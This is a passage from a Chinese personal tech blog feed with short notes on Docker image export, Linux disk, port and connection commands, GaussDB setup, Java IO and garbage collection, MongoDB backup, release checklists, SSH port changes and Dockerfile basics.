        <content type="html"><![CDATA[<p>涉及的命令有export、import、save、load</p><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>export命令是从容器（container）中导出tar文件，而save命令则是从镜像（images）中导出。</p><p>export命令导出的tar文件略小于save命令导出的。</p><p>export导出的文件再import回去时，无法保留镜像所有历史（即每一层layer信息，不熟悉的可以去看Dockerfile），不能进行回滚操作；而save是依据镜像来的，所以导入时可以完整保留下每一层layer信息。如下图所示，nginx:latest是save导出load导入的，nginx:imp是export导出import导入的。</p><ul><li>若是只想备份images，使用save、load即可</li><li>若是在启动容器后，容器内容有变化，需要备份，则使用export、import</li><li>需要注意这两对命令不能交错使用，否则无法启动容器</li></ul><h2 id="save-load"><a href="#save-load" class="headerlink" title="save load"></a>save load</h2><p>导出</p><blockquote><p>docker save [options] images [images…]</p></blockquote><p>例如 </p><blockquote><p>docker save -o nginx.tar nginx:latest</p></blockquote><p>导入 </p><blockquote><p>docker load [options]</p></blockquote><p>例如</p><blockquote><p>docker load -i nginx.tar</p></blockquote><h2 id="export-import"><a href="#export-import" class="headerlink" title="export  import"></a>export  import</h2><p>导出</p><blockquote><p>docker export [options] container</p></blockquote><p>其中-o表示输出到文件，nginx-test.tar为目标文件，nginx-test是源容器名（name）</p><p>例如</p><blockquote><p>docker export -o nginx-test.tar nginx-test</p></blockquote><p>导入</p><blockquote><p>docker import [options] file|URL|- [REPOSITORY[:TAG]]</p></blockquote><p> 例如</p><blockquote><p>docker import nginx-test.tar nginx:imp</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.csdn.net/ncdx111/article/details/79878098" target="_blank" rel="noopener">https://blog.csdn.net/ncdx111/article/details/79878098</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux 磁盘管理</title>
      <link href="/linux/linux/linux-disk/"/>
      <url>/linux/linux/linux-disk/</url>
      
        <content type="html"><![CDATA[<h2 id="fdisk-命令"><a href="#fdisk-命令" class="headerlink" title="fdisk 命令"></a>fdisk 命令</h2><p>查看硬盘</p><blockquote><p>fdisk -l </p></blockquote><p>查看磁盘的使用情况命令</p><blockquote><p>df -h</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>GaussDB 安装教程</title>
      <link href="/mysql/mysql/gauss%20db/"/>
      <url>/mysql/mysql/gauss%20db/</url>
      
        <content type="html"><![CDATA[<p>pvcreate /dev/vdb<br>vgcreate mate /dev/vdb</p><p>lvcreate -n gaussdb -L 150G mate<br>mkdir /GDEMate<br>mkfs.xfx /dev/mate/gaussdb<br>mount /dev/mate/gaussdb /GDEMate</p><p>echo “mount /dev/mate/gaussdb /GDEMate” &gt;&gt; /etc/rc.lcoal</p><p>规划目录</p><p>groupadd dbgrp<br>useradd -g dbgrp -d /GDEMate/gaussdba -m -s /bin/bash gaussdba</p><p>echo “GDEMate#321” | passwod –stdin gaussdba</p><p>mkdir /GdeMate/gaussdba/data<br>chown -R gaussdba:dbgrp /GDEMate/gaussdba</p><p>chmod -R 0750 /GDEMate/gaussdba<br>chmod -R 0700 /GDEMate/gaussdba/data</p><p>安装</p><p>mkdir -p  /opt/software/guassdb</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 正则</title>
      <link href="/java/java/jav-regrex/"/>
      <url>/java/java/jav-regrex/</url>
      
        <content type="html"><![CDATA[<h2 id="提取字符串中的字符"><a href="#提取字符串中的字符" class="headerlink" title="提取字符串中的字符"></a>提取字符串中的字符</h2><p>提取字符串中的数字</p><pre><code>public static void main(String[]args) {    Pattern p = Pattern.compile(&quot;\\d+&quot;);    Matcher m = p.matcher(&quot;string1234more567string890&quot;);    while(m.find()) {        System.out.println(m.group());    }}</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.testingexcellence.com/extract-numbers-string-java-regular-expressions/" target="_blank" rel="noopener">https://www.testingexcellence.com/extract-numbers-string-java-regular-expressions/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 各种流总结</title>
      <link href="/java/java/java-io/"/>
      <url>/java/java/java-io/</url>
      
        <content type="html"><![CDATA[<h2 id="字节流"><a href="#字节流" class="headerlink" title="字节流"></a>字节流</h2><p>字节流与字符无关，可以处理所有的资源类型。</p><p>两个抽象类</p><ul><li>InputStream</li><li>OutputStream</li></ul><p>JDK 提供常用的类有</p><ul><li>FileInputStream</li><li>FileOutputSteam</li></ul><h2 id="字符流"><a href="#字符流" class="headerlink" title="字符流"></a>字符流</h2><p>字符流需要考虑编码，只能处理文本文件。字节流变成字符流需要解码，字符流编程字节流需要编码。</p><p>两个抽象类</p><ul><li>Reader</li><li>Writer </li></ul><p>可用的类</p><ul><li>FileReader</li><li>FileWriter</li></ul><h2 id="缓冲流"><a href="#缓冲流" class="headerlink" title="缓冲流"></a>缓冲流</h2><p>缓冲流依赖字符流,拥有缓冲区机制，可以提高性能。</p><ul><li>BufferedReader</li><li>BufferedWriter</li></ul><h2 id="节点流"><a href="#节点流" class="headerlink" title="节点流"></a>节点流</h2><p>从字节数组中创建流，使用后无需关闭。当文件不大时，可以直接读取到字节数组。</p><ul><li>ByteArrayInputSteam</li><li>ByteArrayOutputSteam</li></ul><h2 id="处理流"><a href="#处理流" class="headerlink" title="处理流"></a>处理流</h2><p>处理流在输出数据时，可以输出数据类型，只能是基本类型和字符串。处理流，用的比较少。</p><ul><li>DataInputSteam </li><li>DataOuputSteam</li></ul><h2 id="序列化处理流"><a href="#序列化处理流" class="headerlink" title="序列化处理流"></a>序列化处理流</h2><p>用于序列化和序列化，可以将对象类型输出到文件。</p><ul><li>ObjectInputStream</li><li>ObjectOutputStream</li></ul><p>使用 Java 自带的序列化机制，被序列化对象需要增加 Seriablizable 接口。<br>如果不需要序列化的字段使用 transient 标注。</p><h2 id="打印流"><a href="#打印流" class="headerlink" title="打印流"></a>打印流</h2><p>用于控制台打印输出，常见用处是将控制台的输出打印到文件中，日志框架一般通过这种方式，作为日志输出。</p><ul><li>PrintStream</li></ul><pre><code>System.setOut(new PrintStream(new FileOutputSteam(&quot;./test.log&quot;)，true)</code></pre>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 内存回收机制</title>
      <link href="/java/java/java-gc/"/>
      <url>/java/java/java-gc/</url>
      
        <content type="html"><![CDATA[<h2 id="java-8-基本机制"><a href="#java-8-基本机制" class="headerlink" title="java 8 基本机制"></a>java 8 基本机制</h2><p>GC 帮助回收内存的两个任务：</p><ul><li>发现无用的对象</li><li>回收无用的对象占用的内存空间</li></ul><p>垃圾回收算法</p><ul><li>引用计数法</li><li>引用可达，通过图收集引用信息</li></ul><h2 id="通用的分代垃圾回收机制"><a href="#通用的分代垃圾回收机制" class="headerlink" title="通用的分代垃圾回收机制"></a>通用的分代垃圾回收机制</h2><p>分代垃圾回收机制，是基于这样一个事实：不同的对象的生命周期是不一样的。因此，不同生命周期的对象可以采取不同的回收算法，以便提高回收效率。我们将对象分为三种状态：年轻代、年老代、持久代。JVM将堆内存划分为 Eden、Survivor 和 Tenured/Old 空间。</p><h3 id="三种分代内存模型"><a href="#三种分代内存模型" class="headerlink" title="三种分代内存模型"></a>三种分代内存模型</h3><ol><li>年轻代</li></ol><p>　　所有新生成的对象首先都是放在Eden区。 年轻代的目标就是尽可能快速的收集掉那些生命周期短的对象，对应的是Minor GC，每次 Minor GC 会清理年轻代的内存，算法采用效率较高的复制算法，频繁的操作，但是会浪费内存空间。当“年轻代”区域存放满对象后，就将对象存放到年老代区域。</p><ol start="2"><li>年老代</li></ol><p>　　在年轻代中经历了N(默认15)次垃圾回收后仍然存活的对象，就会被放到年老代中。因此，可以认为年老代中存放的都是一些生命周期较长的对象。年老代对象越来越多，我们就需要启动Major GC和Full GC(全量回收)，来一次大扫除，全面清理年轻代区域和年老代区域。</p><ol start="3"><li>持久代</li></ol><p>　　用于存放静态文件，如Java类、方法等。持久代对垃圾回收没有显著影响。</p><h3 id="三种-GC"><a href="#三种-GC" class="headerlink" title="三种 GC"></a>三种 GC</h3><p><strong>Minor GC</strong></p><p>用于清理年轻代区域。Eden区满了就会触发一次Minor GC。清理无用对象，将有用对象复制到“Survivor1”、“Survivor2”区中(这两个区，大小空间也相同，同一时刻Survivor1和Survivor2只有一个在用，一个为空)</p><p><strong>Major GC</strong></p><p>用于清理老年代区域。</p><p><strong>Full GC</strong></p><p>用于清理年轻代、年老代区域。 成本较高，会对系统性能产生影响。</p><h3 id="垃圾回收过程"><a href="#垃圾回收过程" class="headerlink" title="垃圾回收过程"></a>垃圾回收过程</h3><ol><li>新创建的对象，绝大多数都会存储在Eden中，</li><li>当Eden满了（达到一定比例）不能创建新对象，则触发垃圾回收（GC），将无用对象清理掉，然后剩余对象复制到某个Survivor中，如S1，同时清空Eden区</li><li>当Eden区再次满了，会将S1中的不能清空的对象存到另外一个Survivor中，如S2，同时将Eden区中的不能清空的对象，也复制到S1中，保证Eden和S1，均被清空。</li><li>重复多次(默认15次)Survivor中没有被清理的对象，则会复制到老年代Old(Tenured)区中</li><li>当Old区满了，则会触发一个一次完整地垃圾回收（FullGC），之前新生代的垃圾回收称为（minorGC）</li></ol><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.sxt.cn/Java_jQuery_in_action/The_garbage_collection_mechanism.html" target="_blank" rel="noopener">https://www.sxt.cn/Java_jQuery_in_action/The_garbage_collection_mechanism.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CI/CD 搭建清单</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/ci-cd-checklist/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/ci-cd-checklist/</url>
      
        <content type="html"><![CDATA[<ul><li>代码库<ul><li>gitlab </li><li>crendential</li></ul></li><li>Jenkins<ul><li>搭建 Jenkin</li><li>配置 salve</li><li></li></ul></li><li>构建<ul><li></li><li>web hook </li></ul></li><li>部署<ul><li>非生产</li><li>生产</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mongodb 的数据导入\导出</title>
      <link href="/mongodb/mongodb/data-export-import/"/>
      <url>/mongodb/mongodb/data-export-import/</url>
      
        <content type="html"><![CDATA[<p>mongodb数据备份和恢复主要分为二种：一种是针对库的mongodump和mongorestore，一种是针对库中表的mongoexport和mongoimport</p><p>mongorestore 比较常用。</p><h2 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h2><blockquote><p>mongodump -d SERVERLOG -o /data/mongobak/SERVERLOG.bak/</p></blockquote><h2 id="导入指定文件夹下的数据"><a href="#导入指定文件夹下的数据" class="headerlink" title="导入指定文件夹下的数据"></a>导入指定文件夹下的数据</h2><blockquote><p>mongorestore -d &lt;db_name&gt; &lt;bson_folder&gt;</p></blockquote><p>windows 下找到 C 盘中 mongdodb/server/bin, mongdo提供了一些工具软件</p><blockquote><p>mongorestore.exe -d &lt;db_name&gt; &lt;bson_folder&gt;</p></blockquote><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://docs.mongodb.com/manual/reference/program/mongorestore/" target="_blank" rel="noopener">https://docs.mongodb.com/manual/reference/program/mongorestore/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> mongodb </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>上线检查清单</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/release-note/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/release-note/</url>
      
        <content type="html"><![CDATA[<h2 id="上线前"><a href="#上线前" class="headerlink" title="上线前"></a>上线前</h2><ul><li>创建任务卡</li><li>创建代码库上线分支</li><li>提前发送业务中断信息，包括邮件和悬挂系统通知</li><li>准备部署脚本 （例如 shell、ansible）和线上配置文件（例如Nginx配置）</li><li>制定上线计划</li><li>在低版本演练上线计划</li><li>在低版本演练灾备恢复</li><li>记录当前系统运行的版本号，软件包，需要准备好回退计划</li><li>有条件的，进行安全测试</li></ul><h2 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h2><ul><li>执行上线动作至少需要两人pair操作（大量误操作造成事故的案例），可以创建线上会议直播上线操作</li><li>停服后需要监控数据流量，确保流量为0后再进行数据、配置和线上软件包的备份</li><li>上线失败后使用回退计划</li><li>尽量不对线上环境进行手动配置，如果无法实现自动化部署，应添加到上线计划中</li></ul><h2 id="上线完成后"><a href="#上线完成后" class="headerlink" title="上线完成后"></a>上线完成后</h2><ul><li>使用专用的 health check 接口检查系统健康状态</li><li>核对线上系统的版本号是否和预期一致，如果没有版本号指标，可以通过服务部署时间确</li><li>检查服务器负载是否在健康范围内</li><li>其他授权下的线上测试</li><li>检查日志平台是否有日志到达</li><li>检查日志中是否有错误信息</li><li>发送业务恢复邮件和系统通知</li><li>上线完成后，需要当前线上环境的信息更新文档</li><li>新的IP地址、服务器配置信息等</li><li>最新线上的版本号、软件包、配置文件</li><li>上线计划</li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>java 性能监控</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/java-apm/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/java-apm/</url>
      
        <content type="html"><![CDATA[<p>使用 APM 技术可以监控 java 的堆栈信息、JVM 信息等。</p>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux nc 工具零时监听端口</title>
      <link href="/linux/linux/linux-nc/"/>
      <url>/linux/linux/linux-nc/</url>
      
        <content type="html"><![CDATA[<p>为了测试端口是否开放，需要临时开启端口</p><p>可以使用文件描述符:</p><blockquote><p>lsof -i:6066</p></blockquote><p>以及</p><blockquote><p>nc -l 0.0.0.0 6066<br>netstat -ntlp 就能查看端口了</p></blockquote><h2 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h2><ul><li><a href="https://www.v2ex.com/amp/t/459497" target="_blank" rel="noopener">https://www.v2ex.com/amp/t/459497</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux 查看端口状态</title>
      <link href="/linux/linux/linux-port/"/>
      <url>/linux/linux/linux-port/</url>
      
        <content type="html"><![CDATA[<p>主要使用 netstat 命令，各个参数说明如下：</p><p>　　-t : 指明显示TCP端口</p><p>　　-u : 指明显示UDP端口</p><p>　　-l : 仅显示监听套接字(所谓套接字就是使应用程序能够读写与收发通讯协议(protocol)与资料的程序)</p><p>　　-p : 显示进程标识符和程序名称，每一个套接字/端口都属于一个程序。</p><p>　　-n : 不进行DNS轮询，显示IP(可以加速操作)</p><p>查看所有的 TCP 端口</p><blockquote><p>netstat -ntlp   </p></blockquote><p>统计端口连接数量</p><blockquote><p>netstat -pnt |grep :3306 |wc</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>查看 linux 中的 TCP 连接数</title>
      <link href="/linux/linux/linux-tcp-connections/"/>
      <url>/linux/linux/linux-tcp-connections/</url>
      
        <content type="html"><![CDATA[<p>查看连接到本机的连接</p><blockquote><p>netstat -an</p></blockquote><p>统计 80 端口的连接数</p><blockquote><p>netstat -nat|grep -i “80”|wc -l</p></blockquote><p>统计httpd协议连接数</p><blockquote><p>ps -ef|grep httpd|wc -l</p></blockquote><p>统计已连接上的，状态为“established</p><blockquote><p>netstat -na|grep ESTABLISHED|wc -l</p></blockquote><p>查出哪个IP地址连接最多</p><blockquote><p>netstat -na|grep ESTABLISHED|awk {print $5}|awk -F: {print $1}|sort|uniq -c|sort -r +0n</p></blockquote><blockquote><p>netstat -na|grep SYN|awk {print $5}|awk -F: {print $1}|sort|uniq -c|sort -r +0n</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.cnblogs.com/felixzh/p/7737160.html" target="_blank" rel="noopener">https://www.cnblogs.com/felixzh/p/7737160.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux 常用线上排错命令</title>
      <link href="/linux/linux/linux-common-ops/"/>
      <url>/linux/linux/linux-common-ops/</url>
      
        <content type="html"><![CDATA[<h2 id="安装一些调试工具"><a href="#安装一些调试工具" class="headerlink" title="安装一些调试工具"></a>安装一些调试工具</h2><blockquote><p>yum install -y telnet</p></blockquote><blockquote><p>yum install git</p></blockquote><blockquote><p>yum install httpd-tools</p></blockquote><blockquote><p>yum install java-1.8.0-openjdk.x86_64</p></blockquote><h2 id="查看打开的文件数"><a href="#查看打开的文件数" class="headerlink" title="查看打开的文件数"></a>查看打开的文件数</h2><p>linux tcp 连接是通过文件描述符 FD 也就是每个链接创建了一个虚拟文件。系统的连接数是有限制，如果连接数超过最大数量会得到一个异常。如果是一些流忘记关闭，会造成此类错误。</p><blockquote><p>lsof -n | awk ‘{print $2}’ sort | uniq -c | sort -nr | more</p></blockquote><p>显示的左侧是句柄数，右侧是进程号，可以查看当前系统打开的句柄数量</p><pre><code>1117 83316 714 486 525 83525 465 83649 411 64791</code></pre><p>通过</p><blockquote><p>ps -ax | grep 83316</p></blockquote><p>查看当前进程的应用程序</p><blockquote><p>83316 ??        14:48.23 /Applications/IntelliJ IDEA.app/Contents/MacOS/idea</p></blockquote><p>发现 idea 开了 1117 个文件</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>SSH 修改端口</title>
      <link href="/linux/linux/ssh-change-port/"/>
      <url>/linux/linux/ssh-change-port/</url>
      
        <content type="html"><![CDATA[<p>修改修改配置文件</p><blockquote><p>vim /etc/ssh/sshd_config</p></blockquote><p>找到#port 22 这一行，默认端口 22，可以添加多个端口</p><p>重启 ssh 服务即可</p><blockquote><p>sudo systemctl restart sshd</p></blockquote><p>可能需要配置防火墙</p><p>重启时遇到错误  </p><pre><code>Job for sshd.service failed because the control process exited with error code. See &quot;systemctl status sshd.service&quot; and &quot;journalctl -xe&quot; for details.[ansible@manager1 ~]$ systemctl status sshd.service● sshd.service - OpenSSH server daemon   Loaded: loaded (/usr/lib/systemd/system/sshd.service; enabled; vendor preset: enabled)   Active: activating (auto-restart) (Result: exit-code) since Wed 2019-12-18 14:22:24 UTC; 29s ago     Docs: man:sshd(8)           man:sshd_config(5)  Process: 6503 ExecStart=/usr/sbin/sshd -D $OPTIONS (code=exited, status=255) Main PID: 6503 (code=exited, status=255)</code></pre><p>需要关闭 SeLinux</p><p>查看 selinux 状态</p><blockquote><p>sestatus </p></blockquote><p>修改配置</p><blockquote><p>vim /etc/selinux/config</p></blockquote><p>编辑配置并修改</p><blockquote><p>SELINUX=disabled</p></blockquote><p>然后重启即可</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>关闭 se linux <a href="https://www.landui.com/help/show-8381" target="_blank" rel="noopener">https://www.landui.com/help/show-8381</a></li><li><a href="https://zhidao.baidu.com/question/1951738957393461188.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/1951738957393461188.html</a></li><li>关于重启失败的错误 <a href="https://stackoverflow.com/questions/11672525/centos-6-3-ssh-bind-to-port-xxx-on-0-0-0-0-failed-permission-denied" target="_blank" rel="noopener">https://stackoverflow.com/questions/11672525/centos-6-3-ssh-bind-to-port-xxx-on-0-0-0-0-failed-permission-denied</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mongodb 中时间戳的问题</title>
      <link href="/mongodb/mongodb/bson-time-stamp/"/>
      <url>/mongodb/mongodb/bson-time-stamp/</url>
      
        <content type="html"><![CDATA[<p>Java 中 BsonTimestamp 的时间是秒数。</p><p>注意生成当前时间戳的时候需要做一些处理，例如 </p><blockquote><p>new BSONTimestamp((int) (now.getTime() / 1000), 0))</p></blockquote><p>推荐使用 BSONTimestamp 类型。</p><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li><a href="https://www.programcreek.com/java-api-examples/index.php?api=org.bson.types.BSONTimestamp" target="_blank" rel="noopener">https://www.programcreek.com/java-api-examples/index.php?api=org.bson.types.BSONTimestamp</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> mongodb </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring boot 项目中常见的日志配置</title>
      <link href="/Spring/spring/springboot-logging/"/>
      <url>/Spring/spring/springboot-logging/</url>
      
        <content type="html"><![CDATA[<h2 id="建议开启-webclient-相关的日志"><a href="#建议开启-webclient-相关的日志" class="headerlink" title="建议开启 webclient 相关的日志"></a>建议开启 webclient 相关的日志</h2><h3 id="使用-RestTemplate"><a href="#使用-RestTemplate" class="headerlink" title="使用 RestTemplate"></a>使用 RestTemplate</h3><p>使用 application.properties 的方法</p><pre><code>logging.level.org.springframework.web.client=DEBUG</code></pre><p>使用 application.yml 的方法</p><pre><code>logging:  level:      root: WARN    org.springframework.web.client: DEBUG</code></pre><h3 id="使用-FeignClient"><a href="#使用-FeignClient" class="headerlink" title="使用 FeignClient"></a>使用 FeignClient</h3><p>增加一个 Feign 配置类</p><pre><code>@Configurationpublic class FeignConfiguration {    @Bean    Logger.Level feignLoggerLevel() {        //这里记录所有，根据实际情况选择合适的日志level        return Logger.Level.FULL;    }}</code></pre><p>在 feign 的接口上增加配置类 </p><pre><code>configuration = FeignConfiguration.class</code></pre><p>修改日志级别</p><pre><code>logging.level.&lt;FeignClient类的全路径&gt; = DEBUG</code></pre><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li><a href="https://stackoverflow.com/questions/7952154/spring-resttemplate-how-to-enable-full-debugging-logging-of-requests-responses" target="_blank" rel="noopener">https://stackoverflow.com/questions/7952154/spring-resttemplate-how-to-enable-full-debugging-logging-of-requests-responses</a></li><li>FeignClient日志打印 <a href="https://www.cnblogs.com/lemondada/p/11270648.html" target="_blank" rel="noopener">https://www.cnblogs.com/lemondada/p/11270648.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Jenkins</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/jenkins/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/jenkins/</url>
      
        <content type="html"><![CDATA[<p>Jenkins 安装可以 Docker 非常容易的安装，需要注意安装后升级 Jenkins，才能使用很多插件，以及安装一些必要的插件。</p><h2 id="常用的插件"><a href="#常用的插件" class="headerlink" title="常用的插件"></a>常用的插件</h2><h3 id="Pipeline"><a href="#Pipeline" class="headerlink" title="Pipeline"></a>Pipeline</h3><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><p>可以直接配置一个 DOCKER_HOST 然后访问部署 docker</p><h3 id="Monitor"><a href="#Monitor" class="headerlink" title="Monitor"></a>Monitor</h3><h3 id="Docker-Swarm"><a href="#Docker-Swarm" class="headerlink" title="Docker Swarm"></a>Docker Swarm</h3><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>docker 安装指南 <a href="https://jenkins.io/zh/doc/book/installing/" target="_blank" rel="noopener">https://jenkins.io/zh/doc/book/installing/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>关机和重启命令</title>
      <link href="/linux/linux/linux-shutdown/"/>
      <url>/linux/linux/linux-shutdown/</url>
      
        <content type="html"><![CDATA[<h2 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h2><blockquote><p>sudo shutdown</p></blockquote><h2 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h2><blockquote><p>sudo shutdown -r 0</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Resttemplat 使用</title>
      <link href="/Spring/spring/spring-rest-template/"/>
      <url>/Spring/spring/spring-rest-template/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring-boot-2-0-后定义方式"><a href="#Spring-boot-2-0-后定义方式" class="headerlink" title="Spring boot 2.0 后定义方式"></a>Spring boot 2.0 后定义方式</h2><p>Spring boot 2.0 后可以使用 RestTemplateBuilder 来定义，下面是一个定义 bean 并设置超时时间的方法。</p><pre><code>@Configurationpublic class RestConfig {    @Bean    public RestTemplate restTemplate(RestTemplateBuilder builder) {        return builder                .setConnectTimeout(Duration.ofMillis(3000))                .setReadTimeout(Duration.ofMillis(3000))                .build();    }}</code></pre><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li>定义 RestTemplate 方法 <a href="https://stackoverflow.com/questions/13837012/spring-resttemplate-timeout" target="_blank" rel="noopener">https://stackoverflow.com/questions/13837012/spring-resttemplate-timeout</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Dockerfile 详解</title>
      <link href="/docker/docker/dockerfile/"/>
      <url>/docker/docker/dockerfile/</url>
      
        <content type="html"><![CDATA[<h2 id="Dockerfile-编写基础"><a href="#Dockerfile-编写基础" class="headerlink" title="Dockerfile 编写基础"></a>Dockerfile 编写基础</h2><p>我们可以通过编写 Dockerfile 构建出 Docker 镜像，Dockerfile 可以看作为一个用于构建镜像的 Linux 命令集。Docker 在构建镜像的过程中，执行这个命令集，安装必要的软件以及一些基本的配置。</p><p>一个基本的 Dockerfle</p><pre><code>FROM docker.io/nginxCOPY ./test.html /usr/share/nginx/htm/index.htmlCOPY nginx.conf /etc/nginx/conf.d/default.confCMD [&quot;nginx&quot;,&quot;-g&quot;,&quot;daemon off;&quot;]</code></pre><ul><li>FROM 指明基础镜像，COPY 为复制资源文件命令， CMD 为容器启动时的命令。</li></ul><p>“Dockerfile” 是 Docker 默认的的文件名，也可使用 -f 参数进行指定其他文件名。</p><blockquote><p>docker build -t user/image:tag .<br>docker build -t user/image:new -f Dockerfile.new</p></blockquote><h3 id="Dockerfile-编写的注意事项"><a href="#Dockerfile-编写的注意事项" class="headerlink" title="Dockerfile 编写的注意事项"></a>Dockerfile 编写的注意事项</h3><p>尽可能自动化，避免 Y/n 提示导致构建失败。</p><p>考虑命令的顺序,后面的命令会依赖前面的结果。</p><p>如果很长的命令可以使用 \&amp;&amp; 来进行连接,例如</p><pre><code>RUN echo &#39;this is a long message&#39; \&amp;&amp; echo &#39;hello&#39;</code></pre><p>如果 Dockerfile 存放的目录还有其他文件，例如 node_modules 等超大型文件集合，Docker 也会发送到 Daemon 去构建，因此可以使用 .dockerignore 来排除文件，加快构建速度。.dockerignore 文件的语法类似于 .gitignore。</p><p>另外，一个容器最好只做一件事情，如果将数据库、前端静态页面、后端网站等都放到一个容器中，这样就失去了容器的意义。如果需要编排各种应用，可以使用 docker-compose 进行编排。</p><h2 id="Dockerfile-命令"><a href="#Dockerfile-命令" class="headerlink" title="Dockerfile 命令"></a>Dockerfile 命令</h2><h3 id="解析器命令"><a href="#解析器命令" class="headerlink" title="解析器命令"></a>解析器命令</h3><p>解析器命令是可选的，它影响 Dockerfile 后续的处理方式。解析器命令告诉 Docker 如何处理后续的命令，使用注释的形式，写下 FROM 命令之前，否则会被作为注释处理。</p><p>目前只有一个解析命令，escape </p><pre><code># escape=`FROM ...COPY testfile.txt c:\\</code></pre><p>因为在 windows 下转义字符为 \ 因此 c:\ 会被解析成 c:\</p><h3 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h3><p>FORM 命令用来表明，使用那个镜像作为基础构建，一般情况下都有基础镜像。FROM 必须是 Dockerfile 的第一句命令。</p><blockquote><p>FROM <a href="imageName:tag" target="_blank" rel="noopener">imageName:tag</a></p></blockquote><p>可以编写多个 FROM 会以最后一个镜像为准。</p><h3 id="MAINTAINER"><a href="#MAINTAINER" class="headerlink" title="MAINTAINER"></a>MAINTAINER</h3><p>指定维护者，方便其他人联系作者，这个命令已经弃用，可以使用 LABEL 命令。</p><blockquote><p>MAINTAINER NAME <email></email></p></blockquote><h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><p>指定在编译阶段的命令， RUN 会在 shell 环境下执行命令，用于安装软件或者做配置使用。</p><blockquote><p>RUN echo Hi</p></blockquote><p>RUN 命令会在当前的镜像的顶层执行命令，然后 commit 一个中间镜像，提交的镜像会在下一个 RUN 中使用。 Docker 构建完成后会删除中间镜像。</p><p>使用 RUN 的格式为 </p><blockquote><p>RUN [“程序名”,”参数1”,”参数2”]</p></blockquote><h3 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h3><p>ENV 命令用来执行 docker run 命令时设置的环境变量，这个环境变量可以在后续的命令中使用。</p><blockquote><p>ENV <key> 